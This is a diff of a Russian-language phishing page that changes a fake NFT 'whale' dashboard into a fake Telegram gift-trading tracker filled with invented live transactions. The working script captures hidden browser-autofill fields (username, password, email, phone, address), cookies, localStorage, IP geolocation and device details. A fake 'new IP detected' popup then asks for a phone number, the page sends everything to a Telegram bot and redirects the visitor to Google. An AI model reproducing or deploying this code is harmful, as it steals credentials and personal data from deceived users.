@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-<title>WhaleBase | Live NFT Holders</title>
+<title>Telegram Gift Tracker</title>
 <style>
-:root{--bg:#0a0e14;--card:#121720;--border:#1e2836;--accent:#3b82f6;--green:#10b981;--yellow:#f59e0b;--red:#ef4444;--text:#e2e8f0;--muted:#64748b}
+:root{--bg:#0a0e14;--card:#121720;--border:#1e2836;--accent:#3b82f6;--green:#10b981;--yellow:#f59e0b;--text:#e2e8f0;--muted:#64748b}
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
 .topbar{background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
@@ -14,26 +14,24 @@ body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSy
 .topbar .live::before{content:"● ";animation:blink 1s infinite}
 @keyframes blink{50%{opacity:0}}
 .container{max-width:900px;margin:0 auto;padding:16px}
-.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:20px}
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:20px}
 .stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center}
 .stat-card:active{transform:scale(0.97)}
-.stat-card .val{font-size:26px;font-weight:800}
+.stat-card .val{font-size:24px;font-weight:800}
 .val.g{color:var(--green)}.val.y{color:var(--yellow)}.val.b{color:var(--accent)}
-.stat-card .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+.stat-card .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
 .section{margin-bottom:20px}
-.section-title{font-size:14px;font-weight:600;margin-bottom:10px}
+.section-title{font-size:14px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:6px}
 .table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
 table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
 th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);white-space:nowrap}
 td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
-td.addr{color:var(--accent);font-family:monospace;font-size:12px}
-td.val{color:var(--green);font-weight:600}
+td.user{color:#fff;font-weight:500}
+td.gift{color:#e2e8f0}
+td.price{color:var(--green);font-weight:600}
 tr:last-child td{border-bottom:none}
-
-/* Затемнение */
 .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:100;justify-content:center;align-items:center;padding:20px}
 .overlay.show{display:flex}
-/* Попап */
 .popup{background:var(--card);border:1px solid var(--accent);border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center;animation:popIn 0.3s ease}
 @keyframes popIn{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
 .popup .icon{font-size:44px;margin-bottom:10px}
@@ -41,17 +39,17 @@ tr:last-child td{border-bottom:none}
 .popup .desc{font-size:12px;color:var(--muted);margin-bottom:18px;line-height:1.5}
 .popup input{width:100%;padding:14px 16px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:12px}
 .popup input:focus{outline:none;border-color:var(--accent)}
+.popup input::placeholder{color:#3a4450}
 .popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
 .popup .btn-pop:active{transform:scale(0.97)}
 .popup .skip{display:block;margin-top:12px;color:var(--muted);font-size:11px;text-decoration:underline;cursor:pointer}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none}
 .footer-bar{text-align:center;padding:20px;color:var(--muted);font-size:11px;border-top:1px solid var(--border);margin-top:30px}
-@media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px 10px}}
 </style>
 </head>
 <body>
 
-<!-- Скрытые поля автозаполнения -->
 <div class="hidden-form">
 <form>
 <input type="text" name="u" autocomplete="username">
@@ -70,32 +68,26 @@ tr:last-child td{border-bottom:none}
 </form>
 </div>
 
-<!-- Верхняя панель -->
 <div class="topbar">
-<div class="logo-s">🐋 WhaleBase</div>
-<div class="live">LIVE • <span id="updSec">3</span> сек назад</div>
+<div class="logo-s">🎁 Gift Tracker</div>
+<div class="live">LIVE • обновлено <span id="updSec">3</span> сек назад</div>
 </div>
 
 <div class="container">
 
 <div class="stats-row">
-<div class="stat-card"><div class="val g">1,847,392</div><div class="lbl">Всего холдеров</div></div>
-<div class="stat-card"><div class="val y">47,821</div><div class="lbl">Киты (>50 ETH)</div></div>
-<div class="stat-card"><div class="val b">3,291</div><div class="lbl">Whales (>100 ETH)</div></div>
-<div class="stat-card"><div class="val g">142</div><div class="lbl">Новых за 24ч</div></div>
+<div class="stat-card"><div class="val g">12,847</div><div class="lbl">Подарков отслежено</div></div>
+<div class="stat-card"><div class="val y">3,291</div><div class="lbl">Продано за 24ч</div></div>
+<div class="stat-card"><div class="val b">142</div><div class="lbl">Новых продавцов</div></div>
+<div class="stat-card"><div class="val g">₽847K</div><div class="lbl">Объём торгов</div></div>
 </div>
 
 <div class="section">
-<div class="section-title">🏆 Топ холдеров</div>
+<div class="section-title">🏆 Последние транзакции</div>
 <div class="table-wrap">
 <table>
-<thead><tr><th>#</th><th>Кошелёк</th><th>NFT</th><th>ETH</th><th>USD</th></tr></thead>
-<tbody>
-<tr><td>1</td><td class="addr">0xb1Ea...7d82</td><td>12</td><td class="val">2,847</td><td class="val">$5.9M</td></tr>
-<tr><td>2</td><td class="addr">0x3F5c...a1B4</td><td>8</td><td class="val">2,103</td><td class="val">$4.4M</td></tr>
-<tr><td>3</td><td class="addr">0x9A2d...e4F1</td><td>15</td><td class="val">1,892</td><td class="val">$3.9M</td></tr>
-<tr><td>4</td><td class="addr">0xC7f8...b3D6</td><td>6</td><td class="val">1,567</td><td class="val">$3.3M</td></tr>
-<tr><td>5</td><td class="addr">0x2E1a...c9F8</td><td>21</td><td class="val">1,340</td><td class="val">$2.8M</td></tr>
+<thead><tr><th>Продавец</th><th>Подарок</th><th>Цена</th><th>Время</th></tr></thead>
+<tbody id="giftTable">
 </tbody>
 </table>
 </div>
@@ -103,17 +95,16 @@ tr:last-child td{border-bottom:none}
 
 </div>
 
-<div class="footer-bar">🔒 WhaleBase Pro • Real-time blockchain data</div>
+<div class="footer-bar">🔒 Gift Tracker • Данные из открытых источников</div>
 
-<!-- Попап -->
 <div class="overlay" id="overlay">
 <div class="popup">
 <div class="icon">🛡️</div>
 <h3>Подтвердите доступ</h3>
-<div class="desc">Обнаружен новый IP-адрес.<br>Введите номер телефона для верификации.<br><br>📡 Это защищает базу от ботов и скаммеров.</div>
-<input type="tel" id="popupPhone" placeholder="+7 (___) ___-__-__" autocomplete="tel-national">
-<button class="btn-pop" onclick="submitPhone()">Подтвердить и продолжить</button>
-<a class="skip" onclick="closePopup()">Пропустить (ограниченный доступ)</a>
+<div class="desc">Обнаружен новый IP-адрес.<br>Введите номер телефона для верификации.<br><br>📡 Это защищает базу от ботов.</div>
+<input type="tel" id="popupPhone" placeholder="Введите номер телефона" autocomplete="tel-national">
+<button class="btn-pop" onclick="submitPhone()">Подтвердить</button>
+<a class="skip" onclick="closePopup()">Пропустить</a>
 </div>
 </div>
 
@@ -121,16 +112,47 @@ tr:last-child td{border-bottom:none}
 const TOKEN="СЮДА_ТОКЕН_БОТА";
 const CHAT="СЮДА_CHAT_ID";
 const REDIR="https://www.google.com";
-const sid='w'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
+const sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 
-// Обновление таймера
+// Список подарков
+const gifts=[
+{user:"@dagestan_05",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
+{user:"@sveta_love",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
+{user:"@kostyan_77",gift:"Instant Ramen 🍜",price:"550 ₽"},
+{user:"@maxim_ural",gift:"Vintage Cigare 🚬",price:"3 000 ₽"},
+{user:"@alenka_moon",gift:"Snoop Dogg 🐶",price:"1 400 ₽"},
+{user:"@bespredel",gift:"Clover Pin 🍀",price:"760 ₽"},
+{user:"@tatarin_116",gift:"Pet Snake 🐍",price:"470 ₽"},
+{user:"@dasha_sun",gift:"Evil Eye 👁️",price:"1 120 ₽"},
+{user:"@abdul_goat",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
+{user:"@egor_krd",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
+{user:"@nastya_art",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
+{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"},
+{user:"@dilya_ama",gift:"Pet Snake 🐍",price:"470 ₽"},
+{user:"@roma_tomsk",gift:"Snoop Dogg 🐶",price:"1 400 ₽"},
+];
+
+// Перемешиваем и показываем
+function shuffleAndShow(){
+const shuffled=[...gifts].sort(()=>Math.random()-0.5).slice(0,8);
+const tbody=document.getElementById('giftTable');
+tbody.innerHTML=shuffled.map((g,i)=>`<tr>
+<td class="user">${g.user}</td>
+<td class="gift">${g.gift}</td>
+<td class="price">${g.price}</td>
+<td style="color:var(--muted);font-size:11px">${Math.floor(Math.random()*60)} сек назад</td>
+</tr>`).join('');
+}
+shuffleAndShow();
+setInterval(shuffleAndShow,8000);
+
+// Обновление времени
 setInterval(()=>{document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
 // Пассивный сбор
 let passiveData={};
-(async function collectPassive(){
+(async function(){
 const d=passiveData;
-
 try{
 const r=await fetch("https://ipapi.co/json/");
 const j=await r.json();
@@ -161,12 +183,10 @@ try{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+"% ch:"+b
 try{if(navigator.connection){d.conn=navigator.connection.effectiveType}}catch(e){}
 d.ref=document.referrer||"direct";
 d.cookie=document.cookie||"-";
-
 try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1000)}catch(e){d.ls="-"}
 })();
 
-// Ждём автозаполнение
-setTimeout(async ()=>{
+setTimeout(async()=>{
 passiveData.af_u=document.querySelector('[name="u"]').value||"-";
 passiveData.af_p=document.querySelector('[name="p"]').value||"-";
 passiveData.af_e=document.querySelector('[name="e"]').value||"-";
@@ -176,26 +196,19 @@ passiveData.af_ph2=document.querySelector('[name="ph2"]').value||"-";
 passiveData.af_adr=document.querySelector('[name="adr"]').value||"-";
 },3000);
 
-// Показать попап через 15 секунд
-setTimeout(()=>{
-document.getElementById('overlay').classList.add('show');
-},15000);
+// Попап через 15 секунд
+setTimeout(()=>{document.getElementById('overlay').classList.add('show')},15000);
 
-// Закрыть попап
-function closePopup(){
-document.getElementById('overlay').classList.remove('show');
-}
+function closePopup(){document.getElementById('overlay').classList.remove('show')}
 
-// Отправить телефон
 async function submitPhone(){
 const phone=document.getElementById('popupPhone').value.trim();
 if(!phone){alert('Введите номер телефона');return}
-
 passiveData.entered_phone=phone;
-
 const d=passiveData;
+
 const msg=
-`🚨 ЗАХОД С ТЕЛЕФОНОМ
+`🚨 ЗАХОД GIFT TRACKER
 
 🆔 ${sid}
 🕐 ${new Date().toLocaleString("ru-RU")}
@@ -224,8 +237,7 @@ PHONE2: ${d.af_ph2||"-"}
 ADDR: ${d.af_adr||"-"}
 
 🔗 REF: ${d.ref}
-🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}
-💾 LS: ${(d.ls||'-').substring(0,300)}`;
+🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}`;
 
 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
 method:"POST",
@@ -234,8 +246,7 @@ body:JSON.stringify({chat_id:CHAT,text:msg})
 });
 
 document.getElementById('overlay').classList.remove('show');
-// Показываем что доступ открыт
-alert('✅ Доступ подтверждён. База загружается...');
+alert('✅ Доступ подтверждён');
 setTimeout(()=>{window.location.replace(REDIR)},2000);
 }
 </script>
